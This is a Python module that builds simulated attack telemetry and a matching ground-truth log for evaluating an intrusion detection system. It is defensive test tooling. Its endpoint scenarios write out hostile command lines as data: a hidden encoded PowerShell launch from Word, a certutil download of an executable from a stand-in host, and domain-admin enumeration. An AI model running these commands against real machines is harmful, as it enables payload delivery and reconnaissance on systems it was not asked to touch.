"""
attack_sim.py - synthetic attacks in UCES format, with a matching ground-truth log.

WHY THIS EXISTS: the sample dump is baseline-only (no attacks), so detection quality cannot be
measured on it. These scenarios are injected into the HELD-OUT day to make evaluation possible.
They are SIMULATED. Replace with real captures (Nmap / Hydra against the test setup) as soon as
you have them: just produce an `attack_log` DataFrame with the same columns.

attack_log columns: attack_id, attack_type, entity, entity_type, start, end
"""
from __future__ import annotations

import hashlib
import string

import numpy as np
import pandas as pd

NET_SENSOR = "IDS-SENSOR-01"


def _eid(tag: str, i: int) -> str:
    return hashlib.sha256(f"sim|{tag}|{i}".encode()).hexdigest()


def _iso(ts: pd.Timestamp) -> str:
    ts = pd.Timestamp(ts)
    ts = ts.tz_convert("UTC").tz_localize(None) if ts.tzinfo else ts
    return ts.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ts.microsecond // 1000:03d}Z"


def _clean(d: dict) -> dict:
    return {k: v for k, v in d.items() if v is not None}  # UCES omits null keys


def _net(tag, i, ts, event_type, src, dst, dport, proto, rng, bo=None, bi=None, po=None, pi=None, domain=None):
    return _clean({
        "event_id": _eid(tag, i), "event_time": _iso(ts), "ingest_time": _iso(ts + pd.Timedelta(seconds=1)),
        "source": "network", "host": NET_SENSOR, "event_type": event_type,
        "src_ip": src, "src_port": int(rng.integers(20000, 60000)), "dst_ip": dst, "dst_port": int(dport),
        "protocol": proto, "domain": domain, "bytes_out": bo, "bytes_in": bi, "packets_out": po, "packets_in": pi})


def _ep(tag, i, ts, host, user, process, parent, cmd):
    return _clean({
        "event_id": _eid(tag, i), "event_time": _iso(ts), "ingest_time": _iso(ts + pd.Timedelta(seconds=1)),
        "source": "endpoint", "host": host, "event_type": "process_start", "outcome": "success",
        "user": user, "process": process, "parent_process": parent, "command_line": cmd})


def _rand_label(rng, n):
    return "".join(rng.choice(list(string.ascii_lowercase + string.digits), size=n))


def _log(attack_id, attack_type, entity, entity_type, start, end):
    return {"attack_id": attack_id, "attack_type": attack_type, "entity": entity,
            "entity_type": entity_type, "start": pd.Timestamp(start), "end": pd.Timestamp(end)}


def port_scan(tag, t0, src, dst, n_ports, dur, rng, kind):
    ports = rng.choice(np.arange(1, 10000), size=n_ports, replace=False)
    ev = [_net(tag, i, t0 + pd.Timedelta(seconds=float(rng.uniform(0, dur))), "flow", src, dst, p, "tcp", rng,
               bo=60, bi=40, po=1, pi=1) for i, p in enumerate(ports)]
    return ev, _log(tag, kind, src, "ip", t0, t0 + pd.Timedelta(seconds=dur))


def exfiltration(tag, t0, src, dst, n_flows, bytes_per_flow, rng, kind):
    ev = []
    for i in range(n_flows):
        ts = t0 + pd.Timedelta(seconds=float(rng.uniform(0, 60)))
        ev.append(_net(tag, i, ts, "flow", src, dst, 443, "tls", rng, bo=int(bytes_per_flow),
                       bi=int(rng.integers(4000, 30000)), po=int(bytes_per_flow // 1400), pi=int(rng.integers(30, 200)),
                       ))
    return ev, _log(tag, kind, src, "ip", t0, t0 + pd.Timedelta(seconds=75))


def dns_tunnel(tag, t0, src, resolver, n_queries, dur, rng, kind):
    ev = [_net(tag, i, t0 + pd.Timedelta(seconds=float(rng.uniform(0, dur))), "dns", src, resolver, 53, "dns", rng,
               domain=f"{_rand_label(rng, 32)}.tunnel-cdn.example") for i in range(n_queries)]
    return ev, _log(tag, kind, src, "ip", t0, t0 + pd.Timedelta(seconds=dur))


def smb_fanout(tag, t0, src, n_hosts, dur, rng, kind):
    ev = [_net(tag, i, t0 + pd.Timedelta(seconds=float(rng.uniform(0, dur))), "flow", src, f"192.168.10.{100 + i}", 445,
               "smb", rng, bo=int(rng.integers(1500, 4000)), bi=int(rng.integers(200, 900)), po=6, pi=4)
          for i in range(n_hosts)]
    return ev, _log(tag, kind, src, "ip", t0, t0 + pd.Timedelta(seconds=dur))


def beacon(tag, t0, src, dst, dport, period, minutes, rng, kind):
    ev, t, i = [], t0, 0
    end = t0 + pd.Timedelta(minutes=minutes)
    while t < end:
        ev.append(_net(tag, i, t, "flow", src, dst, dport, "tcp", rng, bo=180, bi=120, po=3, pi=2))
        t += pd.Timedelta(seconds=float(period + rng.uniform(-1, 1)))
        i += 1
    return ev, _log(tag, kind, src, "ip", t0, end)


def office_shell_encoded(tag, t0, host, user, rng, kind):
    payload = "".join(rng.choice(list(string.ascii_letters + string.digits + "+/"), size=180))
    sys32 = "C:\\Windows\\System32\\"
    steps = [
        (sys32 + "WindowsPowerShell\\v1.0\\powershell.exe",
         "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
         f"powershell.exe -NoP -W Hidden -enc {payload}"),
        (sys32 + "whoami.exe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe", "whoami /all"),
        (sys32 + "net.exe", sys32 + "WindowsPowerShell\\v1.0\\powershell.exe", "net group \"Domain Admins\" /domain"),
    ]
    ev = [_ep(tag, i, t0 + pd.Timedelta(seconds=4 * i), host, user, p, par, c) for i, (p, par, c) in enumerate(steps)]
    return ev, _log(tag, kind, host, "host", t0, t0 + pd.Timedelta(seconds=15))


def recon_burst(tag, t0, host, user, n, rng, kind):
    sys32 = "C:\\Windows\\System32\\"
    tools = ["whoami.exe", "net.exe", "ipconfig.exe", "systeminfo.exe", "tasklist.exe", "nltest.exe", "arp.exe",
             "route.exe", "netstat.exe", "hostname.exe", "quser.exe", "schtasks.exe", "reg.exe", "sc.exe"]
    ev = []
    for i in range(n):
        tool = tools[i % len(tools)]
        ev.append(_ep(tag, i, t0 + pd.Timedelta(seconds=float(rng.uniform(0, 55))), host, user, sys32 + tool,
                      sys32 + "cmd.exe", f"{tool} /all"))
    return ev, _log(tag, kind, host, "host", t0, t0 + pd.Timedelta(seconds=55))


def lolbin_download(tag, t0, host, user, kind):
    sys32 = "C:\\Windows\\System32\\"
    ev = [_ep(tag, 0, t0, host, user, sys32 + "certutil.exe", sys32 + "cmd.exe",
              "certutil.exe -urlcache -split -f http://203.0.113.9/p.exe C:\\Users\\Public\\p.exe")]
    return ev, _log(tag, kind, host, "host", t0, t0 + pd.Timedelta(seconds=5))


def build_scenarios(day: str = "2026-10-30", seed: int = 7):
    """11 scenarios (8 network, 3 endpoint) spread over one day. Returns (events_df_records, attack_log DataFrame)."""
    rng = np.random.default_rng(seed)
    d = pd.Timestamp(day, tz="UTC")
    at = lambda h, m: d + pd.Timedelta(hours=h, minutes=m)  # noqa: E731

    parts = [
        # ---- network --------------------------------------------------------------------
        port_scan("N1", at(10, 12), "192.168.10.23", "192.168.10.22", 200, 45, rng, "port_scan_heavy"),
        port_scan("N2", at(11, 20), "192.168.10.21", "192.168.10.24", 12, 55, rng, "port_scan_stealth"),
        port_scan("N3", at(12, 5), "203.0.113.50", "192.168.10.22", 150, 40, rng, "external_scan"),
        exfiltration("N4", at(13, 10), "192.168.10.24", "198.51.100.77", 3, 25_000_000, rng, "exfil_large"),
        exfiltration("N5", at(14, 2), "192.168.10.22", "198.51.100.78", 1, 1_500_000, rng, "exfil_moderate"),
        dns_tunnel("N6", at(9, 40), "192.168.10.21", "192.168.10.1", 45, 58, rng, "dns_tunnel"),
        smb_fanout("N7", at(15, 30), "192.168.10.23", 25, 50, rng, "smb_fanout"),
        beacon("N8", at(16, 0), "192.168.10.22", "203.0.113.99", 4444, 10, 8, rng, "c2_beacon"),
        # ---- endpoint -------------------------------------------------------------------
        office_shell_encoded("E1", at(10, 45), "DESKTOP-7Q2K9LM", "analyst1", rng, "office_encoded_ps"),
        recon_burst("E2", at(11, 50), "LAPTOP-R8N3V2XC", "analyst2", 45, rng, "recon_burst"),
        lolbin_download("E3", at(14, 30), "WS-ACCT-07", "acct1", "lolbin_download"),
    ]
    events = [e for ev, _ in parts for e in ev]
    log = pd.DataFrame([lg for _, lg in parts])
    return events, log
